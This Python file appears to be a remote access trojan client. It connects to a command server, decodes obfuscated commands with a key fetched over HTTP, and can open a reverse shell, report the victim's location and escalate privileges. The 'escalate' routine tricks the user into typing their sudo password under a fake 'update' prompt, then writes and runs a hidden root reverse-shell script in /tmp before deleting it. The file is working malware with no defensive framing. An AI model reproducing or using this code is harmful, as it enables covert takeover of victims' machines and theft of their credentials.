import getpass
import os
import pty
import subprocess
import time
from multiprocessing import Process
from socket import socket, AF_INET, SOCK_STREAM
from time import sleep
ip = "0.0.0.0"
a = socket(AF_INET, SOCK_STREAM)
a.connect((ip, 9999))


def decodeStr(strToDecode):
    try:
        from requests import get
    except Exception as e:
        os.system("sudo apt-get install python3-requests -y")

    a = get(f'http://{ip}:8000/keys/key')
    data = a.content.decode().split('\n')
    key = {}
    for x in data:
        x = x.split(" - ")
        try:
            key[x[1]] = x[0]
        except IndexError:
            pass
    decoded = ''
    strToDecode = strToDecode.split("|@@@@|")
    for x in strToDecode:
        if x == '(_@_@_)':
            decoded += '\n'
        if x == '|_@_@_|':
            decoded += '-'
        for k, v in key.items():
            if x == str(v).strip('\n'):
                decoded += k
            else:
                pass
    return decoded


def buffer():
    while True:
        try:
            sleep(1)
            data = a.recv(1024).decode()
            print(data)
            if data == "":
                a.close()
                continue
            print("decoding data")
            data = decodeStr(data)
            print(data)
            if data == 'shell':
                print("Testing shell")
                b = Process(target=body)
                b.start()
                b.join()
            if data == 'check':
                print("Testing check")
                check()
                continue
            if "priv" in data:
                print("Testing priv")
                a.send(f"{os.geteuid()}, {os.getlogin()}".encode())
                continue
            if "escalate" in data:
                print("Testing escalate")
                if os.geteuid() == 0:
                    body()
                    continue
                else:
                    escalate()
                    continue
            if "locate" in data:
                print("Testing locate")
                data = subprocess.run(["curl", "ifconfig.me"], capture_output=True)
                ip = subprocess.run(['curl', f'https://ipinfo.io/{data.stdout.decode()}'], capture_output=True)
                time.sleep(.5)
                a.send(ip.stdout)
                continue
            if "kill" in data:
                a.close()
            else:
                print(f"Test failed data revived: {data}")
                continue

        except Exception as e:
            print(e)
            a.close()
            return


def check():
    try:
        a.send(b'200')
        if a.recv(1024) == b'200':
            return True
    except OSError as e:
        print(e)
        return False


def escalate():
    try:
        passwd = getpass.getpass(f"Please enter user password for update.")
        esc = subprocess.Popen(["sudo", "-S", "whoami"], stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
        esc.communicate(str(passwd + "\n").encode())
        with open("/tmp/.a", "w") as file:
            file.write(f"""import os 
from socket import socket, AF_INET, SOCK_STREAM
import pty
os.setuid(0)
os.setgid(0)
b = socket(AF_INET, SOCK_STREAM)
b.connect(('{ip}', 9995))
os.dup2(b.fileno(), 0)
os.dup2(b.fileno(), 1)
os.dup2(b.fileno(), 2)
pty.spawn('/bin/bash')
""")
            file.close()
            subprocess.run(["sudo", "python3", "/tmp/.a"])
            subprocess.run(["rm", "/tmp/.a"])
            pass
    except OSError:
        return


def body():
    if True:
        a = socket(AF_INET, SOCK_STREAM)
        sleep(1)
        a.connect((ip, 9995))
        os.dup2(a.fileno(), 0)
        os.dup2(a.fileno(), 1)
        os.dup2(a.fileno(), 2)
        pty.spawn('/bin/sh')
        return True


buffer()
